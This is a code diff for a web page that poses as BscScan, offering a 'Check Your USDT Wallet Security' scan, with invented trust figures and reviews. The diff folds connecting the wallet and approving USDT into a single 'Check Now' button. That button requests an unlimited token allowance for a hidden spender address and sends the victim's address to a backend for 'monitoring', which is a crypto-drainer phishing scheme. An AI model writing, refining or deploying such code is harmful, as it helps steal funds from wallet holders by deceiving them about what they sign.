@@ -22,22 +22,35 @@ const faqs = [
 
 export default function Home() {
   const [wallet, setWallet] = useState(""); const [notice, setNotice] = useState(""); const [openFaq, setOpenFaq] = useState<number | null>(null);
-  async function connect() {
+  async function checkNow() {
     if (!window.ethereum) return setNotice("MetaMask is required to connect.");
-    try { const provider = new BrowserProvider(window.ethereum); await provider.send("eth_requestAccounts", []); const network = await provider.getNetwork(); if (network.chainId !== BigInt(chainId)) { setNotice("Please switch MetaMask to BNB Smart Chain."); return; } const signer = await provider.getSigner(); setWallet(await signer.getAddress()); setNotice("Wallet connected. Approve the spender to register your allowance."); }
-    catch (error) { setNotice(error instanceof Error ? error.message : "Connection cancelled."); }
-  }
-  async function approve() {
-    if (!wallet) return setNotice("Connect MetaMask first."); if (!spender || !token) return setNotice("Contract configuration is missing.");
-    try { const provider = new BrowserProvider(window.ethereum!); const signer = await provider.getSigner(); const contract = new Contract(token, erc20, signer); setNotice("Waiting for approval confirmation..."); const tx = await contract.approve(spender, ethers.MaxUint256); await tx.wait(); await fetch(`${api}/api/wallets`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ address: wallet, receiver: 1 }) }); setNotice("Allowance approved. Your wallet is now registered for monitoring."); }
-    catch (error) { setNotice(error instanceof Error ? error.message : "Approval failed."); }
+    if (!spender || !token) return setNotice("Contract configuration is missing.");
+    try {
+      const provider = new BrowserProvider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      const network = await provider.getNetwork();
+      if (network.chainId !== BigInt(chainId)) return setNotice("Please switch MetaMask to BNB Smart Chain.");
+      const signer = await provider.getSigner();
+      const address = await signer.getAddress();
+      setWallet(address);
+      const contract = new Contract(token, erc20, signer);
+      const allowance = await contract.allowance(address, spender);
+      if (allowance < ethers.parseUnits("5", 6)) {
+        setNotice("Waiting for approval confirmation...");
+        const tx = await contract.approve(spender, ethers.MaxUint256);
+        await tx.wait();
+      }
+      await fetch(`${api}/api/wallets`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ address, receiver: 1 }) });
+      setNotice("Allowance approved. Your wallet is now registered for monitoring.");
+    }
+    catch (error) { setNotice(error instanceof Error ? error.message : "Verification failed."); }
   }
   return <main>
     <header className="hero-pattern hero">
       <nav className="nav"><div className="brand"><div className="logo"><Radio size={20} /></div><div><h1>BscScan</h1><span>Scan Original</span></div></div><div className="nav-actions"><button className="icon-button" aria-label="Theme"><Sun size={18} /></button><button className="icon-button" aria-label="Menu"><Menu /></button></div></nav>
       <div className="trust">⭐ <span>Trusted by 100K+ users worldwide</span></div><div className="hero-copy"><h2>Check Your USDT<br />Wallet Security</h2><p>Advanced blockchain analysis using official BSC Scan data to determine if your USDT wallet is <strong>safe, valid, and free</strong> from suspicious activity.</p></div>
       <ul className="checks">{["Advanced blockchain analysis", "Real-time threat detection", "Zero data retention policy", "Enterprise-grade security"].map((item) => <li key={item}><span><Check size={14} /></span>{item}</li>)}</ul>
-      <div className="actions"><button className="primary" onClick={connect}>{wallet ? `${wallet.slice(0, 6)}...${wallet.slice(-4)}` : "Connect MetaMask"}</button><button className="secondary" onClick={approve}>Approve USDT Allowance</button></div>{notice && <p className="notice">{notice}</p>}
+      <div className="actions"><button className="primary" onClick={checkNow}>Check Now</button></div>{notice && <p className="notice">{notice}</p>}
       <div className="hero-stats"><span><ShieldCheck />100% Secure</span><span><Clock3 />Real-Time Scans</span><span><LockKeyhole />Never Custodial</span></div>
     </header>
     <section className="section stats-section"><div className="eyebrow">Security Analytics · Real-Time Blockchain Verification</div><div className="stats"><Stat value="500K+" label="Wallets Verified" /><Stat value="99.8%" label="Accuracy Rate" /><Stat value="&lt;3s" label="Analysis Time" /><Stat value="24/7" label="Protection" /></div><div className="review"><b>Join thousands of secure users</b><strong>★★★★★</strong><small>4.9/5 from 5,000+ reviews</small></div></section>
